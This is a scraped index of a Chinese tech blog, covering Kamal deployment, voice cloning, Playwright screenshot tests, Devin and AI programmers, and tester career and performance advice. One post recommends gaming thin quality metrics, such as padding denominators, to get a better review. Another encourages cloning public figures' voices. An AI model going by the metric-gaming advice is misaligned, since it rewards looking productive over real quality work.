credentials:edit 确保项目在本地可以 build 成功 用docker build . -t xxxx 去测试一下。\n📝 注意 run 的时候需要提供 RAILS_MASTER_KEY 这个环境变量。\n1 docker run --rm -p 12306:3000 -v ./storage:/rails/storage -e RAILS_MASTER_KEY=xxxx --name oled oled 安装 kamal 感觉不需要用 bundle 装，直接全局装最省事。\n1 2 gem install kamal kamal version 初始化项目 1 kamal init 这条命令会生成 2 个文件\n.env: rails7.0x 里面.gitignore 文件里没有加这个，一定要手动加进去，不要提交到代码库 config/deploy.yml： 核心配置文件 修改 deploy.yml 文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 # Name of your application. Used to uniquely configure containers. service: up-to-date # Name of the container image. image: my-user-name/up-to-date # Deploy to these servers. servers: web: # Use a named role, so it can be used as entrypoint by Traefik hosts: - my-server-ip labels: traefik.http.routers.up-to-date-web.entrypoints: websecure traefik.http.routers.up-to-date-web.rule: Host(`up.ethanhan.cc`) traefik.http.routers.up-to-date-web.tls.certresolver: letsencrypt traefik.http.routers.up-to-date-web.tls: true # Credentials for your image host. registry: # Specify the registry server, if you\u0026#39;re not using Docker Hub # server: registry.digitalocean.com / ghcr.io / ... username: my-user-name # Always use an access token rather than real password when possible. password: - KAMAL_REGISTRY_PASSWORD env: clear: RUBY_YJIT_ENABLE: 1 RAILS_SERVE_STATIC_FILES: true secret: - RAILS_MASTER_KEY volumes: - \u0026#34;/root/up_to_date/storage:/rails/storage\u0026#34; # # Use a different ssh user than root ssh: user: root traefik: options: publish: - \u0026#34;443:443\u0026#34; volume: - \u0026#34;/letsencrypt/acme.json:/letsencrypt/acme.json\u0026#34; # To save the configuration file. args: entryPoints.web.address: \u0026#34;:80\u0026#34; entryPoints.websecure.address: \u0026#34;:443\u0026#34; entrypoints.websecure.http.tls: true entryPoints.web.http.redirections.entryPoint.to: websecure # We want to force https entryPoints.web.http.redirections.entryPoint.scheme: https entryPoints.web.http.redirections.entrypoint.permanent: true certificatesResolvers.letsencrypt.acme.email: \u0026#34;me@ethanhan.cc\u0026#34; certificatesResolvers.letsencrypt.acme.storage: \u0026#34;/letsencrypt/acme.json\u0026#34; # Must match the path in `volume` certificatesResolvers.letsencrypt.acme.httpchallenge: true certificatesResolvers.letsencrypt.acme.httpchallenge.entrypoint: web # Must match the role in `servers` builder: local: arch: amd64 下面要配置 ssl 证书的存储，非常重要 🚀。\n1 2 3 $ mkdir -p /letsencrypt \u0026amp;\u0026amp; touch /letsencrypt/acme.json \u0026amp;\u0026amp; chmod 600 /letsencrypt/acme.json 基本上照搬上面的配置就好了，应该直接可以实现自动 https 和证书续期的功能。\n配置远程环境 1 kamal setup 官方文档解释了这步的作用。\nThis will:\nConnect to the servers over SSH (using root by default, authenticated by your ssh key) Install Docker and curl on any server that might be missing it (using apt-get): root access is needed via ssh for this. Log into the registry both locally and remotely Build the image using the standard Dockerfile in the root of the application. Push the image to the registry. Pull the image from the registry onto the servers. Push the ENV variables from .env onto the servers. Ensure Traefik is running and accepting traffic on port 80. Ensure your app responds with 200 OK to GET /up (you must have curl installed inside your app image!). Start a new container with the version of the app that matches the current git version hash. Stop the old container running the previous version of the app. Prune unused images and stopped containers to ensure servers don’t fill up. 重启 traefik 1 kamal traefik reboot 这才是真正重新读取配置文件然后重启。🚗 不要用kamal traefic restart\n重启之后看日志里的报错。\n1 kamal traefik logs | grep error 一般来说没有严重的报错就可以了。\ncloudflare 配置注意 如果用 cf 的话，注意要把 SSL/TLS 配置里 mode 改成 FULL。 总结 目前还没搞明白怎么在 traefik 里配置多个 subdomain 的操作，所以上面的配置不能算是完整体。有一篇文章提到过配置方法，有空需要研究一下。\n","date":"2024-03-19T20:18:54+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8kamal%E9%83%A8%E7%BD%B2rails%E9%A1%B9%E7%9B%AE/","title":"如何使用kamal部署rails项目"},{"content":"之前就看到有人推荐GPT-SoVITS项目，据说只要提供很少的声音素材就可以克隆一个人的声音，不仅训练时间短，而且中文的效果非常好，最近正好有点时间，稍微弄了一下，大家可以听一下效果。\n只能说是神似，毕竟准备的训练数据比较一般，加上是 mac 上做的训练，据说本身效果就会差点，buff 叠满了，效果一般般也正常，下次准备在一台有显卡的机器上再试一次。\n通过克隆自己声音来体验训练模型的过程 不过尽管结果不太尽如人意，我还是推荐大家有时间也去训练个模型，把自己的声音克隆一下。因为这样可以简简单单的了解一下模型训练的过程，比如 GPT-SoVITS 从训练模型到推理 tts 的过程大致可以分为\n数据集处理：准备足够的训练数据，首先需要提取人声，然后去除混响，获得比较纯净的高质量人声；接下来还要切分音频并给音频降噪，然后再是给音频打标并校对标注，这一步实际上就是把人声对应的文本给记录下来，因为用了声音转文字的引擎，所以工作量其实还好； 训练过程：这一步先输出 logs，我也不知道有啥用；然后开始微调训练，可以自定义训练的轮数和其他一些参数，终于感受到什么叫做训练时的调参了； 推理过程：这一步需要先给出一个 5 秒左右的参考音频，然后把你要合成的文本输入进去，推理一段时间之后就可以生成音频了； 自己体验训练的过程还是非常有意思的，毕竟隔行如隔山，如果大家想往 ai 行业发展的话，有训练模型的经历应该是对求职有帮助的。\n可以克隆其他人的声音 一些公共人物或者虚拟人物的声音其实想对来说比自己的声音更好克隆，因为他们的声音素材相对较多，而且声音质量比自己录制的要高不少。我们可以克隆一些声音来自娱自乐，比如有时间的话我可以克隆一下虫师的声音，然后跟我的声音剪辑在一起来做一个播客。大家也可以天马行空，关公战秦琼式的混搭，不过要注意一些法律上的风险。\n人人都能训练自己的模型 这个项目最大的意义我觉得是它大大拉低了个人训练模型的门槛，原则上只要提供十几秒的声音就可以进行训练和克隆，而且训练过程非常迅速（至少在我的 macbook pro 上如此），让小白可以非常低成本的训练模型，因为之前的各种模型要么是对数据要求非常苛刻（海量数据），要么是对训练的机器要求很高（比如 A100 显卡），普通人很难触及到训练这一层面。不过有理由相信，随着科学炼丹的发展，后面将会有越来越多的项目提供更多模态的低门槛模型训练能力吧。\n","date":"2024-03-16T18:39:39+08:00","permalink":"zh.ethanhan.cc/p/%E6%88%91%E5%85%8B%E9%9A%86%E4%BA%86%E8%87%AA%E5%B7%B1%E7%9A%84%E5%A3%B0%E9%9F%B3%E4%BA%BA%E4%BA%BA%E9%83%BD%E8%83%BD%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%97%B6%E4%BB%A3%E5%88%B0%E4%BA%86/","title":"我克隆了自己的声音：人人都能训练模型的时代到了"},{"content":"Playwright 做为新一代的浏览器 ui 自动化测试工具，有很多有意思的功能，其中截图对比就是其中一个。\n本质上讲 playwright 的图片对比测试其实就是基准测试，其流程大致如下：\n先运行一遍测试用例，把代码里定义的需要截图的地方都截图，这些截图就是以后测试的基准了，后面所有的比较都是针对于这次截图进行的 第一遍运行测试用例时候用例会报错，因为之前没有任何截图，不过没关系，再运行一次就可以了 任何时候都可以再次运行用例，此时会拿本次运行时的截图跟第一次保存的截图做像素级的比较，一旦像素有差异用例就会失败，否则用例通过 下面简单介绍一下如何从零开始使用 playwright 进行截图对比测试。\n安装 playwright 安装 playwright 之前，大家需要安装 nodejs，这一步可以自行搜索。\n这里推荐大家使用Typescript进行代码的编写。主要是因为在入门阶段我们基本上不会接触到复杂的 typescript 语法结构，难度其实跟写 javascript 差不多，心智上的压力其实不算大。最重要的一点是，使用 typescript+vscode+playwright 这套微软组合（三者都是微软出品的），可以在编辑器里非常容易的得到稳定的代码提示，毕竟 ts 可以算得上是静态语言，对于初学者来说代码提示有时候是非常重要的。\n因为国内的网络问题，整个安装过程需要用到淘宝 npm 源。\n打开命令行，敲入下面的命令。不知道怎么使用命令行的同学可以自行搜索弄清楚命令行是怎么回事。\n1 2 3 4 5 6 npm install -D @playwright/test --registry=https://registry.npmmirror.com npm install -D typescript --registry=https://registry.npmmirror.com npx playwright install mkdir -p tests touch tests/itest.info.spec.ts 第 1 行是安装 playwright 及测试套件；第 2 行是安装 typescript，第 3 行是安装 playwright 需要调用的浏览器。最后两行则创建了 tests 文件夹并创建了名为itest.info.spec.ts的文件。\n第一个用例 在itest.info.spec.ts中输入下面的内容。\n1 2 3 4 5 6 import { test, expect } from \u0026#34;@playwright/test\u0026#34;; test(\u0026#34;Itest.info homepage\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;http://www.itest.info\u0026#34;); await expect(page).toHaveScreenshot(); }); 上面代码的意思是跳转到重定向学院的首页www.itest.info，然后截图，如果截图跟之前保存的像素级别一致，那么用例通过，否则用例失败。\n在命令行里用下面的命令运行用例。\n1 npx playwright test 第一次运行时大概率会报下名的错误Error: A snapshot doesn't exist at .......png, writing actual. ，这是正常的，因为之前确实没有保存基准的截图，所以这次运行之后 playwright 会自动把这次运行时的截图保存下来作为基准，再运行一次上面的命令不出意外的话用例就会通过了，这时候命令行的输出大致如下。\n1 2 3 4 5 Running 1 test using 1 worker ✓ 1 tests/itest.info.spec.ts:3:5 › Itest.info homepage (1.7s) 1 passed (2.2s) 更多运行方式 playwright 默认运行用例的时候浏览器默认是运行在 headless 模式下的，也就是说我们看不到浏览器在做什么，在调试的时候这是很不友好的。不过 playwright 提供了多种运行方式，非常好用。\n展示 html 报告\n1 npx playwright test --reporter html 运行结束后 playwright 会自动展示 html 格式的测试报告，其中可以看到每一步的运行时缩略图，非常好用，推荐默认就这样运行。\n非 headless 模式运行\n这种运行方式可以保持浏览器开启，并且会打开 playwright 自带的运行时 ui，调试起来非常方便。\n1 npx playwright test --ui 更新基准截图 很好理解，每次增加用例或者重构用例之后我们都希望可以更新基准截图,用下面的命令。\n1 2 3 npx playwright test -u # or npx playwright test --update-snapshots 截图整个页面 默认情况下 playwright 不会截整个页面，只会默认分辨率大小的一屏，有时候我们却希望可以截图整个屏幕，这时候可以用下面的方式。\n1 2 3 4 5 test(\u0026#34;Itest.info course page\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;http://www.itest.info\u0026#34;); await page.getByRole(\u0026#34;link\u0026#34;).filter({ hasText: \u0026#34;课程\u0026#34; }).click(); await expect(page).toHaveScreenshot({ fullPage: true }); }); 只截图某个元素 如果我们在测试一个电商网站，那么产品页面最重要的元素是什么？个人观点是加入购物车按钮或者是购买按钮。这时候只截图页面上的核心部分就显得非常重要了。如果我们能只截图加购按钮，那么我们可以实现在任意商品详情页上验证加入购物车功能是否失效的能力。\n下面的代码演示了只截图重定向学院主页上查看订阅计划按钮的用例。\n1 2 3 4 5 test(\u0026#34;Itest.info subscribe button\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;http://www.itest.info\u0026#34;); const btn = page.getByRole(\u0026#34;link\u0026#34;).filter({ hasText: \u0026#34;查看订阅计划\u0026#34; }); await expect(btn).toHaveScreenshot(); }); 只截图某个区域 我们也可以指定只截图某个区域，示例代码如下\n1 2 3 4 5 6 7 8 9 await expect(page).toHaveScreenshot({ // square at the center of the page clip: { x: (width - 400) / 2, y: (height - 400) / 2, width: 400, height: 400, }, }); 截图时隐藏某些特定的元素 有时候我们希望测试截图里不要包含页面上的一些敏感信息，比如用户名，用户资产之类的，这时候就需要在截图时去除掉这部分了，playwright 提供的 mask 功能正好可以满足我们的需求。示例代码如下：\n1 2 3 4 5 6 test(\u0026#34;with mask\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;http://www.itest.info\u0026#34;); await expect(page).toHaveScreenshot({ mask: [page.getByAltText(\u0026#34;Placeholder Image\u0026#34;)], }); }); 在上面的代码里，我把页面上所有的图片都给 mask 掉了，大家看截图的时候就会发现被 mask 的区域被玫红色的方块所代替了。\n总结 playwright 的截图对比功能非常完善，基本上是只有要前端页面的项目都可以用起来，这里的核心思路是尽量选择不变的功能或者 ui 进行测试，当然了也可以导入固定的数据来获得同样的效果。这里我总结了一些截图比较的使用场景供大家参考。\n尽量选择页面上具体的并且是不变的的元素或者区域进行截图比较，像我上面举例用的商品详情页的加入购物车按钮等； 如果在测试环境使用，建议每次运行用例前都导入一套固定的数据，这样断言基本上可以无脑写； 使用 mask 或者是引入自定义 css（playwright 支持，我没有举例）的时候屏蔽页面上动态变化的部分； 思考题 playwright 默认的截图路径是哪里？ 是否可以自定义 playwright 的默认截图路径？具体如何配置？ 是否可以自定义截图的文件名？ 默认配置下只要截图和基准截图的像素不一致 playwright 就会认为用例不通过，是否可以自定义截图比较的宽容度？ ","date":"2024-03-16T16:42:27+08:00","permalink":"zh.ethanhan.cc/p/%E6%AF%8F%E4%B8%AA%E9%A1%B9%E7%9B%AE%E9%83%BD%E8%83%BD%E7%94%A8%E4%B8%8A%E5%90%A7%E4%BD%BF%E7%94%A8playwright%E8%BF%9B%E8%A1%8C%E5%9B%BE%E7%89%87%E6%AF%94%E8%BE%83%E6%B5%8B%E8%AF%95/","title":"每个项目都能用上吧:使用Playwright进行图片比较测试"},{"content":"前几天初创公司 Cognition AI ，2 个月前才刚成立一夜之间在 X 卷起了风暴，就因为他们一条浏览量上千万的推文：\n今天，我们很高兴地向大家介绍，第一位 AI 软件工程师 Devin。\n我们来看看这位 AI 程序员能做什么吧。\n自主查阅 api 文档，学习新技术，自主写代码 面对一个需要不时维护的包含不同算法的开源存储库，Devin 拔剑四顾，帮忙查找和修复错误，也就是会改 bug 去自由职业者网站上接私活，并顺利完成任务 看上去这位程序员可以完成普通开发者的工作任务，是不是有这样一种可能：让 AI 诞生的职业，会因为 AI 而失业，典型的教会徒弟，饿死师傅？\n目前已经有人在惊呼：ai 已经可以替代程序员了，结合之前英伟达 ceo 黄仁勋的学代码无用论的观点，看来业界颠覆程序员的野心真是昭然若揭。\n不过事实真的是这样吗？至少在目前这个阶段，我觉得我们大可不必过分担心ai 取代程序员和测试人员的事情，理由有如下几点\n一切都只是 demo 目前 Cognition AI 只是放出了 demo 而已，距离真正的生产环境级别的应用，目前应该还是有一定的距离的。还记得之前 google 放出的多模态人工智能模型演示吗，全程充满了科幻感和不真实感，让人觉得未来已来。然后后续的事实是 google 承认演示 demo 有剪辑的成分，声誉一落千丈。\n另外 Cognition AI 正处在融资的关键阶段，这时候放出 demo，我只能说是懂的都懂。\n在经历了之前超导的全民沸腾和迅速反转之后，没有实锤的结论我们可以先观望一段时间再说。\nai 还不能从事特别复杂的工作 Devin 应该是可以替代程序员和测试人员完成一些创造力有限的重复性工作，对于需要深度思考的工作，ai 的表现只是一般，比如 Devin 在改 github issue 方面可以达到惊人的 13.86%，在一众 ai 竞品中瑶瑶领先，然而还有 86.14%左右的 bug 是 Devin 所不能解决的，换句话说，Devin 目前解决不了大部分的有深度的问题。\n另外就算 Devin 可以日常编写代码，对于大部分的公司来说，可能还需要有专人去 review 这些 ai 生成的代码，试想一下，如果你是老板，你会不会让 ai 修改你代码库里的核心代码，并自由的进行提交？所以就算是 AI 程序员上岗工作，这些 ai 也需要在人类的监督和反馈下才能完成任务，高级的核心程序员和测试还是有生存空间的。\n深度学习大佬 François Chollet 的观点我深以为然——软件工程不是复制和粘贴代码，而是开发和操作问题及其解决方案的心智模型，Devin 还没到这个境界。\n码农和测试人员的工作不只是写代码而已 在日常工作中，我们有很大的一部分精力都会放在沟通和交流上。特别是测试人员，工作往往是在进行动态博弈，需要根据当前质量的情况动态的去调整测试策略和测试时间。很多时候发布的时间是固定的，而开发可能会延迟提测，到最后形成了零和博弈的局面。而这一切 ai 可能难以理解，就算可以理解，ai 也不能替代人类进行项目或者产品层面的沟通交流，起码现在看来还是长路漫漫。\n数据安全问题 对于大多数互联网公司来说，代码是公司的核心资产，也是最重要的数据。让第三方开发的 ai 软件工程师参与到代码的日常编写工作就像是请一群精壮的雇佣兵参观和守护你的金库。一旦稍有闪失，这群雇佣兵可能成为抢劫你财产的先头部队。\n总结 就像是几年前 github 发布 copilot 时一样，总有人会悲观的认为程序员这个行业的丧钟已经敲响，然而两年过去了，事实是 copilot 并没有让程序员们流落街头，真正让码农们失业的是经济环境和投资信心。\n所以不用过分担心 ai 程序员会取代开发和测试人员，创造性和专业性目前看来还有生存的空间。真正需要担心的是一些 nocode 和 rpa 的平台工具，现在的玩法已经彻底升级了。nocode 平台的核心功能就是让用户可以通过简单的操作来完成初级程序员可以做到的事情，现在不需要了，只要告诉 ai 程序员你的需求，剩下的就是从 ai 程序员提交的样品中选择最合适的那款就可以了；rpa 也是同样的道理，简单重复的工作将会越来越简单高效的被 ai 所完成。\n可以预见在不远的将来，程序员和测试人员的技术深度以及业务深度会比广度更加重要，深度靠自己，广度靠 ai。\n","date":"2024-03-15T07:52:03+08:00","permalink":"zh.ethanhan.cc/p/ai%E7%A0%81%E5%86%9C%E6%9D%A5%E4%BA%86ai%E4%BC%9A%E8%AE%A9%E7%A8%8B%E5%BA%8F%E5%91%98%E5%92%8C%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E9%83%BD%E5%A4%B1%E4%B8%9A%E5%90%97/","title":"AI码农来了，AI会让程序员和测试人员都失业吗"},{"content":"翻译了一篇文章，原文是https://automationhacks.io/2024-02-25-what-i-wish-i-knew-about-software-testing-and-growth，感觉还是很有道理的。\n大家好\n我一直在反思一些与社区中一些同行和新兴测试人员和工程师进行的有关测试发展的对话。虽然要解开这些话题需要许多博客文章和演讲,但我想列出一个无序的技能、方法、习惯和成长想法随机清单,这些都是我希望在测试职业生涯开始时就知道的,以求成熟。\n我现在如何看待测试?🤔 测试是一个深层次和多方面的学科,有很多东西要学习,并且有令人难以置信的力量为客户带来愉悦的成果。如果做得好,它可以使整个公司快速行动并自信地交付产品。测试的最终目标是有助于构建令人满意的优质产品和服务。\n技能 🤹 学习盲打 学习思维导图 学习如何评估风险并系统地增加不同层次的测试覆盖范围 学习测试的基础知识,然后不要停止,继续前进。 在会议和讨论中发言(不要害羞) 提出那些\u0026quot;愚蠢\u0026quot;的问题,始终保持好奇心 学习多种语言,包括静态和动态编程语言,以及更多语言 学习编码和阅读大量代码 学习设计高效的 CI/CD 流水线 测试金字塔也表明你可以学习不同层次的测试 不要只关注 UI 或后端。把系统视为一个整体。 专注于客户及其 UI/UX 接触点。这些绝不能中断 学习工具或框架的基本 API,然后不断深入 学习如何在 LeetCode 上解决问题,并了解数据结构和系统设计 学会如何进行向上管理 学习如何建立自己的人际网络 方法和态度 🙂 从任何地方开始 做一个喜欢探索的人 谦逊踏实。认识到总有成长的空间 与新朋友交朋友,帮助他们成长,你也一起成长。 在团队中鼓励心理安全感。 寻找一位导师,让他们教授你一系列主题。然后再找另一位。不断成长。 不要将自己局限于一个领域(Web、移动、后端、数据、性能、安全、CI) - 混合各种事物! 质量是每个人的责任,但需要有人为之效力 如果在某个环境中你没有在学习,要么改变自己,要么改变环境。 利用互联网和广阔开放的测试社区的力量。你会学习得更好更快 当你遇到问题时不要放弃;要舒服地说\u0026quot;我还不知道这个\u0026hellip;\u0026hellip;\u0026quot; 学习某些东西,教给其他人,然后专注于其他更好的事物。 不要成为一个孤立的单点故障 阅读文档是你最好的朋友 你不需要等待一门课程或班级来教授你什么。尽可能自学 清晰的写作即清晰的思维 不要只关注头衔,而是要发展技能。你不等于你的头衔 始终为团队做出正面贡献,专注于成果 不要将自己局限于测试员的单一角色,而要成为一名通才软件工程师 习惯 ⌨️ 建立笔记系统。它会使你更快成长。 安排一致和有目的的学习时间 定期总结和叙述你的工作 养成阅读书籍和总结的习惯 在做日常杂务时听播客。让你的杂务变得有趣! 阅读博客和时事通讯,向同行学习 在会议上提议演讲,作为学习的一种方式 采用开源,成为社区的一部分,尽自己所能贡献。 成长 🌱 以上所有以及\u0026hellip;\u0026hellip; 尽可能在公开场合构建、学习和分享 制定个人路线图和 OKR,并评估自己的进展 维护个人技术品牌 探索在不同的工作环境中工作,如服务、产品、初创公司、成长型公司和大型科技公司,以获得广阔的视野 我遗漏了什么吗?请在评论中告诉我\n","date":"2024-03-10T13:55:26+08:00","permalink":"zh.ethanhan.cc/p/%E6%88%91%E5%B8%8C%E6%9C%9B%E5%9C%A8%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF%E5%BC%80%E5%A7%8B%E6%97%B6%E5%B0%B1%E7%9F%A5%E9%81%93%E7%9A%84%E5%85%B3%E4%BA%8E%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%92%8C%E6%88%90%E9%95%BF%E7%9A%84%E4%BA%8B%E6%83%85/","title":"我希望在职业生涯开始时就知道的关于软件测试和成长的事情"},{"content":"今天是2024年的3月8日，祝所有的测试女神们节日快乐先。\n昨天跟一位同学聊天，发现他去年的年终绩效不是很好，最终可能影响了整体收入，忽然想到是时候聊一下测试同学的绩效问题了。\n作为一个有多年测试管理经验的老人家，之前也经历过非常多的绩效考核和kpi/okr制定，经历的多了自然就会发现一些套路，一般来说测试同学的绩效不好大概是因为如下几个方面。\n质量输出效果很差 这点容易理解，可以分解为两个方面的输出比较不尽如人意。\n结果指标。比如线上问题多，漏测率高等等； 过程指标。比如测试过程中发现不了什么问题等等； 质量输出一般都是有指标来衡量的，要提升的话其实也比较直接：想办法提升核心指标或者加入更多维度的指标来对冲核心指标带来的不利影响。 这点的原理其实有点反直觉，那就是数据其实是会说谎的，片面的指标其实不能真实的反映出现实的问题，举个例子，我的自动化测试用例覆盖率是100%，这个指标看起来很厉害，但现实可能是我只有1个用例，而且完全被覆盖了。所以如果指标没有多维度多角度的话，其实想提升还是有办法的，比如漏测率指标可以想办法提高分母，覆盖率指标可以想办法减小分母之类，只要指标比较单薄，那么操作的空间还是有的。另外就是加入更多的对自己有利的指标，这样也能获得一个不错的观感，毕竟打绩效很多时候都是非常主观的事情。\n输出效能不够理想 我们现在经常说内卷，我觉得可以再加个外卷，从不原教旨主义的基础上扩展一下卷这个词的适用范围。\n外卷，向外去卷。卷竞品，卷价格，卷服务之类的，比较好理解的一个例子就是《唐伯虎点秋香》里面周星驰华府求职卖惨那一段，没错，就是小强这个梗梦开始的地方。 内卷，卷死自己。就是要想马儿跑得快，又要马儿不吃草，别人加班到9点，我就要加到10点，别人1周测1个需求，我1天测1个，并美其名曰这是我效能突出。 所以输出效能不理想实际上就是你的report对象觉得你不够卷自己，单位时间内做的事情不够多，效率不够高。\n这种情况下，一般来说也是有指标加持的，提升的方式跟上面思路是一样的，想办法提升核心能效指标或者加入更多维度的对自己有利的能效指标。\n另外新技术和新方法的引入也能有效的缓解这个问题。说白了就是从上到下都焦虑，引入新的概念有点像是吃抗焦虑药，如果能持续吃下去的话，那么问题在很长一段时间是可以被缓解的。\n测试不重要 团队或者你的report对象觉得测试不重要，因为绩效是很主观的东西，所以你的绩效一定不会太好。\n这个想要破局就非常困难了，毕竟没有统一的方法，不过既然有测试这个岗位存在，那就证明团队里大多数人是疏于测试的。加上现在微服务化之后，业务逻辑被拆的七零八落，很难有人能够从全局上去把握整体的业务逻辑了。所以建议还是要更贴近业务，做最熟悉业务的那个人，毕竟测试不重要但是业务很重要，用黑话说就是把业务当抓手，更团队对齐颗粒度。\n离业务太远或者业务不行了 核心就是你的report对象觉得你对业务没有贡献，这点经常出现在测试开发和一些支撑型的测试人员身上，而且特别容易发生在业务处于平台期或者下降期的团队上。道理很简单，业务都不行了，盘子都变小了，那么就没必要维持那么大的团队规模了，不做业务或者离业务远的同学，不管开发还是测试也好，绩效都不会好。\n这点其实没有非常好的应对方法，要么换个好点的业务团队，要么做新业务领域的探索和尝试，但总是说的容易，做起来难。\n跟上级关系不好 这里分两种情况，一种是业务还行，但就是跟上级不对付，这证明有调整空间，可以参考第三点，先让自己变得重要起来，然后求同存异，希望有关系有所改善；第二种就是业务不行了，而且跟上级相处的不是很融洽，这时候就好好好考虑自己的未来了。\n总结 绩效不好首先不要焦虑吧，人生总是起起伏伏的过程，不可能一帆风顺。前几天看罗伯特 艾格的自传，发现这位迪士尼ceo大佬的人生也不是到处开挂爽文男主，在他最困难的时候他也焦虑到不能控制他自己（字面意义上的），不过他最终走了出来，药方就是：工作只是生活的一部分， 别看的太重，但又不要不屑一顾，毕竟凭自己的能力自食其力的人都应该获得尊重。\n","date":"2024-03-08T08:49:39+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%90%8C%E5%AD%A6%E7%BB%A9%E6%95%88%E4%B8%8D%E5%A5%BD%E6%80%8E%E4%B9%88%E5%8A%9E/","title":"测试同学绩效不好怎么办"},{"content":"前几天随手写了几个headless的selenium爬虫脚本，运行的时候发现本地的chromedriver竟然不需要更新，一时间有点没反应过来，毕竟selenium有个痛点就是chrome 浏览器自动升级之后需要下载新的chromedrier， 否则之前的脚本将会报错。当然了，之前也有一些规避的方式，比如\n关掉chrome的自动升级 用firefox，毕竟geckodriver一年也就更新个2-3个版本 用第三方的driver管理工具，比如python有个webdriver-manager 这些方法其实都挺好，都能解决核心问题，特别是python的webdriver-manager，几行代码就可以保持driver永远自动更新，举个例子\n1 2 3 4 5 6 # selenium 4 from selenium import webdriver from selenium.webdriver.chrome.service import Service as ChromeService from webdriver_manager.chrome import ChromeDriverManager driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install())) 这次不用更新driver是因为使用了官方推出的selenium manager，之前没留意，不过真到用的时候发现还是比较方便的。对我来说selenium manager最方便的就是初始化环境的功能，比如\n自动安装浏览器 自动安装driver 支持多架构多系统 可以配置代理，这点很重要 自动管理浏览器和driver，其实就是把浏览器和driver放在了系统PATH里 如果我有一个脚本需要在windows和macos的最新版本chrome上跑，那么环境初始化就非常容易了，只需要下面的命令\n1 2 selenium-manager --browser chrome selenium-manager --driver chromedriver selenium manager会自动探测机器架构和系统，然后下载chrome浏览器和driver，如果遇到下载不畅的情况，直接设置一下代理就可以了。\n下载 selenium manager让人一头雾水的地方是安装方法，其实selenium manager是不需要安装的，直接下载就好。 selenium manager是用rust写的命令行应用(rust现在势头很盛，比如cloudflare就用rust写了个nginx的平替Pingora)，目前的下载方式还是直接下载二进制文件，下载地址是:https://github.com/SeleniumHQ/selenium_manager_artifacts/releases。该项目更新非常频繁，大家下最新的版本就好。\n保持driver自动更新 思路很简单，如果是非windows机器的话可以使用crontab。\n1 0 5 * * * selenium-manager --driver chromedriver 总结 之前写过文章去介绍selenium manager的具体用法，大家有兴趣可以往回翻一下。这篇文章主要是感慨一下selenium manager给日常工作带来的便利。之前经常遇到的一段时间过后selenium代码执行报错的问题目前是有了工程化的解决方案了，推荐大家使用。\n","date":"2024-02-29T14:28:45+08:00","permalink":"zh.ethanhan.cc/p/selenium-manager%E5%8F%AF%E4%BB%A5%E7%94%A8%E8%B5%B7%E6%9D%A5%E4%BA%86/","title":"Selenium Manager可以用起来了"},{"content":"最近读到这篇文章，原文在是https://drlee.io/implementing-ai-in-software-testing-creating-a-text-generation-model-for-test-automation-7294b26f93c4，里面涉及到一些基于ai进行自动化测试的探索，原文是这么说的：\n将人工智能 (AI) 纳入软件测试可谓是游戏规则的改变者，能够显著提升效率和有效性。本文利用 OpenAI 的文本生成模型——尤其是 GPT-3.5-turbo 和 GPT-4-turbo-preview——在 Google Colab 中构建了一个文本生成模型，重点关注测试自动化用例。\n看了一下，里面列举了3个测试用例。\nThe system shall allow users to securely login with a username and password.\n这是用户登录的用例。\nEnsure that the shopping cart allows users to add items, remove items, and proceed to checkout.\n这是购物车的用例。\nThe weather API should return a JSON response with fields for temperature, humidity, and precipitation forecast for the next 5 days.\n这是用生成基于json返回值的天气api的用例。\n下面是ai生成的购物车用例，看起来还是比较完备的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Regression Test Scenarios for Shopping Cart Feature: 1. Test Case: Adding items to the shopping cart - Verify that the user can add a single item to the shopping cart. - Verify that the user can add multiple items to the shopping cart. - Verify that the quantity of the added items is correctly displayed in the shopping cart. - Verify that the total price of the added items is correctly calculated and updated in the shopping cart. - Verify that the user is able to add items with different variations (e.g., size, color). 2. Test Case: Removing items from the shopping cart - Verify that the user can remove a single item from the shopping cart. - Verify that the user can remove multiple items from the shopping cart. - Verify that the quantity and total price of the removed items are correctly updated in the shopping cart. - Verify that the user is able to remove items with different variations. 3. Test Case: Proceeding to checkout - Verify that the user can proceed to the checkout page from the shopping cart. - Verify that the user is redirected to the correct checkout page. - Verify that the items in the shopping cart are correctly displayed in the checkout page. - Verify that the total price of the items in the shopping cart is correctly displayed in the checkout page. - Verify that the user is able to navigate back to the shopping cart from the checkout page. 后面的工作就是人工介入查缺补漏，然后导入用例管理工具。\n本身代码也很简单。\n1 2 3 4 5 6 7 8 9 10 11 12 13 def generate_test_cases(requirement): response = client.chat.completions.create( model=\u0026#34;gpt-3.5-turbo\u0026#34;, messages=[ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant capable of generating software test cases.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: requirement} ] ) return response.choices[0].message.content feature_description = \u0026#34;Ensure that the shopping cart allows users to add items, remove items, and proceed to checkout.\u0026#34; regression_tests = generate_regression_tests(feature_description) print(regression_tests) 总结 总的来看这篇文章的没什么太多新意，客观上讲目前ai直接生成的用例是不能直接使用的，需要进行一定的加工和优化，不过另一方面我们也必须注意到\nAI确实可以辅助我们进行测试用例的编写，有一定的提效效果 AI的使用门槛确实很低，只需要几行代码就可以实现之前完全无法想象的功能 AI生成的用例可能在教学演示中会有不错的应用，毕竟ai在短时间内创造材料的能力是人类所无法达到的 